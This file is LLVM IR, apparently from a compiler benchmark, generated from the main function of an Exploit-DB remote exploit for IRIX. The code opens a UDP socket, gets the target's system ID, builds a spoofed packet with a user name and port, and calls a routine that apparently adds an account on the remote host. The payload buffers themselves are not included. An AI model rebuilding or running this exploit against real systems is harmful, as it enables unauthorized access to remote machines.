; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/remote/extr_19822.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/remote/extr_19822.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@optind = external dso_local global i32, align 4
@.str = private unnamed_addr constant [6 x i8] c"u:i:p\00", align 1
@optarg = external dso_local global i8*, align 8
@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@sck = common dso_local global i32 0, align 4
@adr = common dso_local global i8 0, align 1
@fake_adrs = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [36 x i8] c"error: can't get system ID for %s.\0A\00", align 1
@dodaj_two = common dso_local global i8* null, align 8
@dodaj_three = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@dodaj_four = common dso_local global i8* null, align 8
@dodaj_five = common dso_local global i8* null, align 8
@dodaj_one = common dso_local global i32* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca [20 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @info(i8* %20)
  %22 = call i32 @exit(i32 0) #3
  unreachable

23:                                               ; preds = %2
  store i32 2, i32* @optind, align 4
  store i32 40, i32* %10, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  br label %24

24:                                               ; preds = %46, %23
  %25 = load i32, i32* %4, align 4
  %26 = load i8**, i8*** %5, align 8
  %27 = call i32 @getopt(i32 %25, i8** %26, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  store i32 %27, i32* %6, align 4
  %28 = icmp ne i32 %27, -1
  br i1 %28, label %29, label %47

29:                                               ; preds = %24
  %30 = load i32, i32* %6, align 4
  switch i32 %30, label %40 [
    i32 117, label %31
    i32 105, label %35
    i32 112, label %38
    i32 63, label %39
  ]

31:                                               ; preds = %29
  %32 = getelementptr inbounds [20 x i8], [20 x i8]* %14, i64 0, i64 0
  %33 = load i8*, i8** @optarg, align 8
  %34 = call i32 @strcpy(i8* %32, i8* %33)
  store i32 1, i32* %7, align 4
  br label %46

35:                                               ; preds = %29
  store i32 62, i32* %8, align 4
  %36 = load i8*, i8** @optarg, align 8
  %37 = call i32 @atoi(i8* %36)
  store i32 %37, i32* %12, align 4
  br label %46

38:                                               ; preds = %29
  store i32 1, i32* %9, align 4
  br label %46

39:                                               ; preds = %29
  br label %40

40:                                               ; preds = %29, %39
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @info(i8* %43)
  %45 = call i32 @exit(i32 1) #3
  unreachable

46:                                               ; preds = %38, %35, %31
  br label %24

47:                                               ; preds = %24
  %48 = load i32, i32* @AF_INET, align 4
  %49 = load i32, i32* @SOCK_DGRAM, align 4
  %50 = call i32 @socket(i32 %48, i32 %49, i32 0)
  store i32 %50, i32* @sck, align 4
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call signext i8 @inet_addr(i8* %53)
  store i8 %54, i8* @adr, align 1
  %55 = load i8*, i8** @fake_adrs, align 8
  %56 = getelementptr inbounds i8, i8* %55, i64 4
  %57 = call i32 @memcpy(i8* %56, i8* @adr, i32 4)
  %58 = call i8* (...) @get_sysinfo()
  store i8* %58, i8** %13, align 8
  %59 = icmp ne i8* %58, null
  br i1 %59, label %66, label %60

60:                                               ; preds = %47
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 1
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.1, i64 0, i64 0), i8* %63)
  %65 = call i32 @exit(i32 1) #3
  unreachable

66:                                               ; preds = %47
  %67 = load i32, i32* %9, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %203, label %69

69:                                               ; preds = %66
  %70 = load i8*, i8** @dodaj_two, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 13
  %72 = load i8*, i8** %13, align 8
  %73 = load i8*, i8** %13, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 0
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = add nsw i32 %76, 1
  %78 = call i32 @memcpy(i8* %71, i8* %72, i32 %77)
  %79 = load i8*, i8** @dodaj_two, align 8
  %80 = load i8*, i8** %13, align 8
  %81 = getelementptr inbounds i8, i8* %80, i64 0
  %82 = load i8, i8* %81, align 1
  %83 = sext i8 %82 to i32
  %84 = add nsw i32 13, %83
  %85 = add nsw i32 %84, 1
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %79, i64 %86
  %88 = load i8*, i8** @dodaj_three, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 0
  %90 = call i32 @memcpy(i8* %87, i8* %89, i32 27)
  %91 = load i8*, i8** %13, align 8
  %92 = getelementptr inbounds i8, i8* %91, i64 0
  %93 = load i8, i8* %92, align 1
  %94 = sext i8 %93 to i32
  %95 = add nsw i32 %94, 1
  %96 = load i32, i32* %10, align 4
  %97 = add i32 %96, %95
  store i32 %97, i32* %10, align 4
  %98 = load i32, i32* %7, align 4
  %99 = icmp ne i32 %98, 0
  br i1 %99, label %103, label %100

100:                                              ; preds = %69
  %101 = getelementptr inbounds [20 x i8], [20 x i8]* %14, i64 0, i64 0
  %102 = call i32 @strcpy(i8* %101, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0))
  br label %103

103:                                              ; preds = %100, %69
  %104 = getelementptr inbounds [20 x i8], [20 x i8]* %14, i64 0, i64 0
  %105 = call signext i8 @strlen(i8* %104)
  %106 = load i8*, i8** @dodaj_two, align 8
  %107 = load i32, i32* %10, align 4
  %108 = add i32 %107, 1
  store i32 %108, i32* %10, align 4
  %109 = zext i32 %107 to i64
  %110 = getelementptr inbounds i8, i8* %106, i64 %109
  store i8 %105, i8* %110, align 1
  %111 = load i8*, i8** @dodaj_two, align 8
  %112 = load i32, i32* %10, align 4
  %113 = zext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %111, i64 %113
  %115 = getelementptr inbounds [20 x i8], [20 x i8]* %14, i64 0, i64 0
  %116 = call i32 @strcpy(i8* %114, i8* %115)
  %117 = getelementptr inbounds [20 x i8], [20 x i8]* %14, i64 0, i64 0
  %118 = call signext i8 @strlen(i8* %117)
  %119 = sext i8 %118 to i32
  %120 = load i32, i32* %10, align 4
  %121 = add i32 %120, %119
  store i32 %121, i32* %10, align 4
  %122 = load i8*, i8** @dodaj_two, align 8
  %123 = load i32, i32* %10, align 4
  %124 = zext i32 %123 to i64
  %125 = getelementptr inbounds i8, i8* %122, i64 %124
  %126 = load i8*, i8** @dodaj_four, align 8
  %127 = getelementptr inbounds i8, i8* %126, i64 0
  %128 = call i32 @memcpy(i8* %125, i8* %127, i32 200)
  %129 = load i32, i32* %10, align 4
  %130 = add i32 %129, 200
  store i32 %130, i32* %10, align 4
  %131 = load i32, i32* %10, align 4
  %132 = sub i32 %131, 15
  store i32 %132, i32* %11, align 4
  %133 = load i32, i32* %8, align 4
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %135, label %177

135:                                              ; preds = %103
  %136 = load i8*, i8** @dodaj_two, align 8
  %137 = load i32, i32* %11, align 4
  %138 = add i32 %137, 1
  store i32 %138, i32* %11, align 4
  %139 = zext i32 %137 to i64
  %140 = getelementptr inbounds i8, i8* %136, i64 %139
  store i8 117, i8* %140, align 1
  %141 = load i8*, i8** @dodaj_two, align 8
  %142 = load i32, i32* %11, align 4
  %143 = add i32 %142, 1
  store i32 %143, i32* %11, align 4
  %144 = zext i32 %142 to i64
  %145 = getelementptr inbounds i8, i8* %141, i64 %144
  store i8 115, i8* %145, align 1
  %146 = load i8*, i8** @dodaj_two, align 8
  %147 = load i32, i32* %11, align 4
  %148 = add i32 %147, 1
  store i32 %148, i32* %11, align 4
  %149 = zext i32 %147 to i64
  %150 = getelementptr inbounds i8, i8* %146, i64 %149
  store i8 101, i8* %150, align 1
  %151 = load i8*, i8** @dodaj_two, align 8
  %152 = load i32, i32* %11, align 4
  %153 = add i32 %152, 1
  store i32 %153, i32* %11, align 4
  %154 = zext i32 %152 to i64
  %155 = getelementptr inbounds i8, i8* %151, i64 %154
  store i8 114, i8* %155, align 1
  %156 = load i8*, i8** @dodaj_two, align 8
  %157 = load i32, i32* %10, align 4
  %158 = add i32 %157, 1
  store i32 %158, i32* %10, align 4
  %159 = zext i32 %157 to i64
  %160 = getelementptr inbounds i8, i8* %156, i64 %159
  store i8 2, i8* %160, align 1
  %161 = load i32, i32* %12, align 4
  %162 = lshr i32 %161, 8
  %163 = trunc i32 %162 to i8
  %164 = load i8*, i8** @dodaj_two, align 8
  %165 = load i32, i32* %10, align 4
  %166 = add i32 %165, 1
  store i32 %166, i32* %10, align 4
  %167 = zext i32 %165 to i64
  %168 = getelementptr inbounds i8, i8* %164, i64 %167
  store i8 %163, i8* %168, align 1
  %169 = load i32, i32* %12, align 4
  %170 = and i32 %169, 255
  %171 = trunc i32 %170 to i8
  %172 = load i8*, i8** @dodaj_two, align 8
  %173 = load i32, i32* %10, align 4
  %174 = add i32 %173, 1
  store i32 %174, i32* %10, align 4
  %175 = zext i32 %173 to i64
  %176 = getelementptr inbounds i8, i8* %172, i64 %175
  store i8 %171, i8* %176, align 1
  br label %183

177:                                              ; preds = %103
  %178 = load i8*, i8** @dodaj_two, align 8
  %179 = load i32, i32* %10, align 4
  %180 = add i32 %179, 1
  store i32 %180, i32* %10, align 4
  %181 = zext i32 %179 to i64
  %182 = getelementptr inbounds i8, i8* %178, i64 %181
  store i8 0, i8* %182, align 1
  br label %183

183:                                              ; preds = %177, %135
  %184 = load i8*, i8** @dodaj_two, align 8
  %185 = load i32, i32* %10, align 4
  %186 = zext i32 %185 to i64
  %187 = getelementptr inbounds i8, i8* %184, i64 %186
  %188 = load i8*, i8** @dodaj_five, align 8
  %189 = getelementptr inbounds i8, i8* %188, i64 0
  %190 = call i32 @memcpy(i8* %187, i8* %189, i32 39)
  %191 = load i32, i32* %10, align 4
  %192 = add i32 %191, 39
  store i32 %192, i32* %10, align 4
  %193 = load i32, i32* %10, align 4
  %194 = lshr i32 %193, 8
  %195 = load i32*, i32** @dodaj_one, align 8
  %196 = getelementptr inbounds i32, i32* %195, i64 10
  store i32 %194, i32* %196, align 4
  %197 = load i32, i32* %10, align 4
  %198 = and i32 %197, 255
  %199 = load i32*, i32** @dodaj_one, align 8
  %200 = getelementptr inbounds i32, i32* %199, i64 11
  store i32 %198, i32* %200, align 4
  %201 = load i32, i32* %10, align 4
  %202 = call i32 @new_account(i32 %201)
  br label %203

203:                                              ; preds = %183, %66
  %204 = load i32, i32* %3, align 4
  ret i32 %204
}

declare dso_local i32 @info(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local signext i8 @inet_addr(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i8* @get_sysinfo(...) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local signext i8 @strlen(i8*) #1

declare dso_local i32 @new_account(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
